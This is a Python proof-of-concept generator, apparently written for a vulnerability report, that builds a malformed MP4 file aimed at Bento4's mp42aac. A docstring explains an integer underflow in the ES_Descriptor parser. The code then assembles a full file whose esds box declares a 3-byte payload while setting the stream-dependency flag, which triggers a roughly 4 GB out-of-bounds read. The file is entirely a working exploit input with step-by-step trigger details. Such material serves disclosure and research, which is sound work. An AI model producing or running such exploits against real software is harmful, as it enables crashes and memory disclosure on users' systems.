#!/usr/bin/env python3
"""
PoC generator for VULN 001:
  CWE-191 Integer Underflow → CWE-125 Out-of-Bounds Read
  File:     Bento4/Source/C++/Core/Ap4EsDescriptor.cpp  (lines 100-103)
  Function: AP4_EsDescriptor::AP4_EsDescriptor(AP4_ByteStream&, AP4_Size, AP4_Size)
  Binary:   mp42aac

Root cause
----------
  stream.ReadUI16(m_EsId);        # 2 bytes consumed
  stream.ReadUI08(bits);          # 1 byte  consumed  (total: 3)
  m_Flags = (bits >> 5) & 7;
  if (m_Flags & AP4_ES_DESCRIPTOR_FLAG_STREAM_DEPENDENCY) {  # flag = 1
      stream.ReadUI16(m_DependsOn);   # 2 MORE bytes consumed (total: 5)
  }
  ...
  # Line 103:
  AP4_SubStream* substream = new AP4_SubStream(stream, offset,
                                 payload_size - AP4_Size(offset - start));
  # With payload_size=3 and 5 bytes consumed:
  # 3 - 5 = 0xFFFFFFFE  (unsigned underflow → ~4 GB SubStream)

Trigger
-------
  ES_Descriptor:
    tag          = 0x03
    payload_size = 3    (declared)
    es_id        = 0x0001  (2 bytes, within payload)
    flags_byte   = 0x20    (1 byte,  within payload; bits[7:5]=001 → m_Flags=1)
    DependsOn    = 0x0002  (2 bytes, BEYOND declared payload — OOB read)
  → payload_size(3) - bytes_consumed(5) = 0xFFFFFFFE  (underflow)
  → SubStream of ~4 GB created; parser reads far beyond declared boundary
"""

import struct
import os
import sys

# ---------------------------------------------------------------------------
# MP4 box helpers
# ---------------------------------------------------------------------------

def make_box(box_type: bytes, content: bytes) -> bytes:
    """Return a plain box: size(4B big-endian) + type(4B) + content."""
    assert len(box_type) == 4
    size = 8 + len(content)
    return struct.pack('>I', size) + box_type + content


def make_fullbox(box_type: bytes, version: int, flags: int, content: bytes) -> bytes:
    """Return a FullBox: size(4) + type(4) + version(1) + flags(3) + content."""
    vh = struct.pack('>B', version) + struct.pack('>I', flags & 0xFFFFFF)[1:]
    return make_box(box_type, vh + content)


# ---------------------------------------------------------------------------
# ftyp box
# ---------------------------------------------------------------------------

def build_ftyp() -> bytes:
    content = (
        b'isom'                    # major brand
        + struct.pack('>I', 0x200) # minor version
        + b'isom'                  # compatible brand 1
        + b'mp41'                  # compatible brand 2
    )
    return make_box(b'ftyp', content)


# ---------------------------------------------------------------------------
# Malicious esds box
#
# Layout in file (offsets relative to ES_Descriptor tag byte):
#   [0]      0x03  ES_DescrTag
#   [1]      0x03  payload_size = 3  (single-byte base-128 varint)
#   --- declared 3-byte payload ---
#   [2]      0x00  es_id (high)
#   [3]      0x01  es_id (low)
#   [4]      0x20  flags_byte  →  m_Flags = (0x20>>5)&7 = 1
#                  (AP4_ES_DESCRIPTOR_FLAG_STREAM_DEPENDENCY = 1 → set)
#   --- BEYOND declared payload; read by stream.ReadUI16(m_DependsOn) ---
#   [5]      0x00  DependsOn_ES_Id (high) — OOB READ #1
#   [6]      0x02  DependsOn_ES_Id (low)  — OOB READ #1
#   --- SubStream starts here with size = 3-5 = 0xFFFFFFFE ---
#   [7]      0x04  DecoderConfigDescriptor tag (parsed as ES_Descriptor sub-desc)
#   [8]      0x0d  payload = 13 (exactly the 13 fixed bytes DecoderConfig reads)
#   [9..21]  13 bytes of DecoderConfig fixed fields
#   [22]     0x06  SLConfigDescriptor tag
#   [23]     0x01  payload = 1  (required for SLConfig)
#   [24]     0x02  predefined = 2 (MP4 file)
# ---------------------------------------------------------------------------

def build_esds() -> bytes:
    es_descriptor = bytes([
        # ES_Descriptor header
        0x03,        # ES_DescrTag
        0x03,        # payload_size = 3

        # --- 3-byte declared payload ---
        0x00, 0x01,  # es_id = 1
        0x20,        # flags_byte: bits[7:5]=001 → m_Flags=1 → streamDependenceFlag

        # --- BEYOND payload (OOB read by stream.ReadUI16(m_DependsOn)) ---
        0x00, 0x02,  # DependsOn_ES_Id = 2  ← 2-byte OOB read

        # --- Sub-descriptor bytes parsed by the ~4 GB SubStream ---
        # DecoderConfigDescriptor  (tag=0x04, payload=13)
        0x04,        # DecoderConfigDescriptor tag
        0x0d,        # payload_size = 13 (exactly what constructor reads)
        0x40,        # objectTypeIndication = 0x40 (Audio ISO/IEC 14496-3)
        0x14,        # bits: streamType=5 (audio), upStream=0  →  (5<<2)|(0<<1) = 0x14
        0x00, 0x00, 0x00,          # bufferSize = 0 (3 bytes)
        0x00, 0x01, 0x00, 0x00,    # maxBitrate = 65536 bps (4 bytes)
        0x00, 0x00, 0x80, 0x00,    # avgBitrate = 32768 bps (4 bytes)
        # (no inner sub-descriptors; payload_size 13 == fixed-field bytes → inner SubStream size = 0)

        # SLConfigDescriptor  (tag=0x06, payload=1, mandatory in ESDescriptor)
        0x06,        # SLConfigDescriptor tag
        0x01,        # payload_size = 1  (DescriptorFactory requires exactly 1)
        0x02,        # predefined = 2 (MP4)
    ])

    version_flags = struct.pack('>I', 0)   # version=0, flags=0
    return make_box(b'esds', version_flags + es_descriptor)


# ---------------------------------------------------------------------------
# mp4a sample entry
# ---------------------------------------------------------------------------

def build_mp4a() -> bytes:
    esds = build_esds()
    content = (
        struct.pack('>6B', 0, 0, 0, 0, 0, 0)   # reserved (6 bytes)
        + struct.pack('>H', 1)                   # data_reference_index = 1
        + struct.pack('>Q', 0)                   # reserved (8 bytes)
        + struct.pack('>H', 2)                   # channelcount = 2
        + struct.pack('>H', 16)                  # samplesize = 16
        + struct.pack('>H', 0)                   # pre_defined
        + struct.pack('>H', 0)                   # reserved
        + struct.pack('>I', 44100 << 16)         # samplerate = 44100 (16.16 fixed)
        + esds
    )
    return make_box(b'mp4a', content)


# ---------------------------------------------------------------------------
# stbl  (sample table — no actual samples)
# ---------------------------------------------------------------------------

def build_stbl() -> bytes:
    mp4a = build_mp4a()

    # stsd: entry_count=1, one mp4a entry
    stsd = make_fullbox(b'stsd', 0, 0, struct.pack('>I', 1) + mp4a)
    # stts: no entries
    stts = make_fullbox(b'stts', 0, 0, struct.pack('>I', 0))
    # stsc: no entries
    stsc = make_fullbox(b'stsc', 0, 0, struct.pack('>I', 0))
    # stsz: sample_size=0, sample_count=0
    stsz = make_fullbox(b'stsz', 0, 0, struct.pack('>II', 0, 0))
    # stco: no entries
    stco = make_fullbox(b'stco', 0, 0, struct.pack('>I', 0))

    return make_box(b'stbl', stsd + stts + stsc + stsz + stco)


# ---------------------------------------------------------------------------
# minf  (media information)
# ---------------------------------------------------------------------------

def build_minf() -> bytes:
    # smhd: sound media header
    smhd = make_fullbox(b'smhd', 0, 0, struct.pack('>HH', 0, 0))

    # dinf / dref / url  (self-contained)
    url_box  = make_fullbox(b'url ', 0, 1, b'')       # flags=1 → self-contained
    dref     = make_fullbox(b'dref', 0, 0, struct.pack('>I', 1) + url_box)
    dinf     = make_box(b'dinf', dref)

    stbl = build_stbl()
    return make_box(b'minf', smhd + dinf + stbl)


# ---------------------------------------------------------------------------
# mdia
# ---------------------------------------------------------------------------

def build_mdia() -> bytes:
    # mdhd: media header
    mdhd_content = (
        struct.pack('>I', 0)       # creation_time
        + struct.pack('>I', 0)     # modification_time
        + struct.pack('>I', 44100) # timescale
        + struct.pack('>I', 0)     # duration
        + struct.pack('>H', 0x55C4)  # language = 'und'
        + struct.pack('>H', 0)     # pre_defined
    )
    mdhd = make_fullbox(b'mdhd', 0, 0, mdhd_content)

    # hdlr: sound handler
    hdlr_content = (
        struct.pack('>I', 0)       # pre_defined
        + b'soun'                  # handler_type
        + struct.pack('>III', 0, 0, 0)  # reserved
        + b'\x00'                  # name (empty, null-terminated)
    )
    hdlr = make_fullbox(b'hdlr', 0, 0, hdlr_content)

    minf = build_minf()
    return make_box(b'mdia', mdhd + hdlr + minf)


# ---------------------------------------------------------------------------
# trak
# ---------------------------------------------------------------------------

def build_trak() -> bytes:
    # tkhd: track header (audio track, flags=3 = enabled + in movie)
    identity_matrix = struct.pack('>9I',
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    tkhd_content = (
        struct.pack('>I', 0)       # creation_time
        + struct.pack('>I', 0)     # modification_time
        + struct.pack('>I', 1)     # track_id = 1
        + struct.pack('>I', 0)     # reserved
        + struct.pack('>I', 0)     # duration
        + struct.pack('>Q', 0)     # reserved (8 bytes)
        + struct.pack('>H', 0)     # layer
        + struct.pack('>H', 0)     # alternate_group
        + struct.pack('>H', 0x0100)  # volume = 1.0 (audio)
        + struct.pack('>H', 0)     # reserved
        + identity_matrix          # matrix (36 bytes)
        + struct.pack('>I', 0)     # width  = 0 (audio)
        + struct.pack('>I', 0)     # height = 0 (audio)
    )
    tkhd = make_fullbox(b'tkhd', 0, 3, tkhd_content)

    mdia = build_mdia()
    return make_box(b'trak', tkhd + mdia)


# ---------------------------------------------------------------------------
# mvhd
# ---------------------------------------------------------------------------

def build_mvhd() -> bytes:
    identity_matrix = struct.pack('>9I',
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    content = (
        struct.pack('>I', 0)           # creation_time
        + struct.pack('>I', 0)         # modification_time
        + struct.pack('>I', 1000)      # timescale
        + struct.pack('>I', 0)         # duration
        + struct.pack('>I', 0x00010000)  # rate = 1.0
        + struct.pack('>H', 0x0100)    # volume = 1.0
        + struct.pack('>H', 0)         # reserved
        + struct.pack('>Q', 0)         # reserved (8 bytes)
        + identity_matrix              # matrix (36 bytes)
        + struct.pack('>6I', 0, 0, 0, 0, 0, 0)  # pre_defined (24 bytes)
        + struct.pack('>I', 2)         # next_track_ID
    )
    return make_fullbox(b'mvhd', 0, 0, content)


# ---------------------------------------------------------------------------
# moov
# ---------------------------------------------------------------------------

def build_moov() -> bytes:
    return make_box(b'moov', build_mvhd() + build_trak())


# ---------------------------------------------------------------------------
# mdat  (empty media data)
# ---------------------------------------------------------------------------

def build_mdat() -> bytes:
    return make_box(b'mdat', b'')


# ---------------------------------------------------------------------------
# Assemble and write
# ---------------------------------------------------------------------------

def main():
    out_dir = os.path.dirname(os.path.abspath(__file__))
    out_path = os.path.join(out_dir, 'vuln_001.mp4')

    mp4 = build_ftyp() + build_moov() + build_mdat()

    with open(out_path, 'wb') as f:
        f.write(mp4)

    print(f"[+] Wrote {len(mp4)} bytes to {out_path}")

    # Print a summary of key offsets for verification
    ftyp_end = len(build_ftyp())
    print(f"[+] ftyp ends at offset {ftyp_end:#x}")
    print("[+] ES_Descriptor trigger bytes (hex):")
    esds_bytes = build_esds()
    # Show the raw esds content
    print(f"    esds ({len(esds_bytes)} bytes): {esds_bytes.hex()}")
    es_start = 12  # after esds box header(8) + version/flags(4)
    es_desc = esds_bytes[es_start:]
    print(f"    ES_Descriptor payload_size field: {es_desc[1]:#04x} (= {es_desc[1]})")
    print(f"    flags_byte (bit trigger):         {es_desc[4]:#04x} → m_Flags={(es_desc[4]>>5)&7}")
    print(f"    DependsOn bytes (OOB read):       {es_desc[5]:#04x} {es_desc[6]:#04x}")
    print(f"[+] Expected underflow: payload_size(3) - bytes_consumed(5) = 0x{(3-5) & 0xFFFFFFFF:08X}")


if __name__ == '__main__':
    main()
